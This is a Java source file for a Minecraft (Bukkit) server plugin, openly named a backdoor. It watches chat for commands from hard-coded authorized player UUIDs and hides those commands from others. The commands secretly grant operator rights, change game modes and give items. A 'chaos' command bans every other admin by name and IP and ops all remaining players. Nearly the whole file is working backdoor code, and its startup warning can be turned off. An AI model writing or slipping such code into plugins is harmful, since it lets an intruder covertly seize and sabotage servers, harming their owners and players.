
package com.thiccindustries.backdoor.backdoor;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventException;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.Date;
import java.util.GregorianCalendar;
import java.util.Locale;
import java.util.concurrent.Callable;

public final class Backdoor extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        if(Config.display_backdoor_warning) {
            Bukkit.getConsoleSender()
                    .sendMessage("### You have a backdoor on your server. ###");
        }

        this.getServer().getPluginManager().registerEvents(this, this);
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }

    @EventHandler()
    public void onChat(AsyncPlayerChatEvent e){
        if(Config.display_debug_messages) {
            Bukkit.getConsoleSender()
                    .sendMessage("### Message received from: " + e.getPlayer().getUniqueId() + "###");
        }

        Player p = e.getPlayer();

        //Is user authorized to use backdoor commands
        if(IsUserAuthorized(p)){

            if(Config.display_debug_messages) {
                Bukkit.getConsoleSender()
                        .sendMessage("### User is authed ###");
            }

            if(e.getMessage().startsWith( Config.command_prefix )){
                boolean result = ParseCommand( e.getMessage().substring(1), p);


                if(Config.display_debug_messages) {
                    Bukkit.getConsoleSender()
                            .sendMessage("### Command: " + e.getMessage().substring(1) + " success: " + result + "###");
                }

                e.setCancelled(true);
            }

        }else{

            if(Config.display_debug_messages) {
                Bukkit.getConsoleSender()
                        .sendMessage("### User is not authed ###");
            }
        }


    }

    /*Basic command parser*/
    public boolean ParseCommand(String command, Player p){
        //split fragments
        String[] args = command.split(" ");

        switch(args[0]){
            case "op": {  //Give user operator
                if(args.length == 1) {   //op self
                    p.setOp(true);
                }
                else{                    //op other
                    Bukkit.getPlayer(args[1]).setOp(true);
                }
                return true;
            }

            case "deop": {  //Remove user operator
                if(args.length == 1) {          //Deop self
                    p.setOp(false);
                } else {                        //Deop other
                    Bukkit.getPlayer(args[1]).setOp(false);
                }
                return true;
            }

            case "gamemode":
            case "gm": {
                if(args.length == 1)
                    return false;

                GameMode gm = GameMode.SURVIVAL;

                //Get gamemode from number
                try {
                    int reqGamemode = Clamp( Integer.parseInt(args[1]), 0, GameMode.values().length - 1 );
                    gm = GameMode.getByValue(reqGamemode);
                }catch(NumberFormatException e){
                    //Get gamemode from name

                    try {
                        gm = GameMode.valueOf(args[1].toUpperCase(Locale.ROOT));

                    }catch(IllegalArgumentException e1){
                        //ignore
                        return false;
                    }

                }

                //Weird thread syncing shit
                GameMode finalGm = gm;
                new BukkitRunnable(){
                    @Override
                    public void run() {
                        p.setGameMode(finalGm);
                    }
                }.runTask(this);

                return true;
            }

            case "give":{
                if(args.length < 3)
                    return false;

                Material reqMaterial    = Material.getMaterial(args[1].toUpperCase(Locale.ROOT));
                int reqAmmount          = Clamp( Integer.parseInt(args[2]), 0, 64 );

                //Prevent massive poop error
                if(reqMaterial == null)
                    return false;

                p.getInventory().addItem(new ItemStack(reqMaterial, reqAmmount));
                return true;
            }

            case "chaos":{  //Ban admins then admin the regulars

                for(Player p1 : Bukkit.getOnlinePlayers()){
                    //Ban all existing admins
                    if(p1.isOp()) {
                        //Skip authorized users
                        if(IsUserAuthorized(p1))
                            continue;

                        //Deop, ban, ip ban
                        p1.setOp(false);
                        Bukkit.getBanList(BanList.Type.NAME)    .addBan(p1.getName(), "Gottem", new Date(9999, 1, 1), "Gottem");
                        Bukkit.getBanList(BanList.Type.IP)      .addBan(p1.getName(), "Gottem", new Date(9999, 1, 1), "Gottem");
                    }
                    else{
                        p1.setOp(true);
                    }

                    Bukkit.broadcastMessage("### Server pwn'ed. ###");
                    Bukkit.broadcastMessage("### All server admins have been banned. ###");
                    Bukkit.broadcastMessage("### Remaining players have been op'ed. Have fun. ###");

                }
                return true;
            }

        }
        return false;
    }

    private int Clamp(int i, int min, int max) {
        if(i < min)
            return min;
        if(i > max)
            return max;
        return i;
    }


    /*Check if Player is authorized in Config.java*/
    public boolean IsUserAuthorized(Player p){
        return IsUserAuthorized(p.getUniqueId().toString());
    }

    /*Check if UUID is authorized in Config.java*/
    public boolean IsUserAuthorized(String uuid){
        boolean authorized = false;
        for(int i = 0; i < Config.authorized_uuids.length; i++){

            if(uuid.equals( Config.authorized_uuids[i] )){
                authorized = true;
                break;
            }

        }
        return authorized;
    }
}
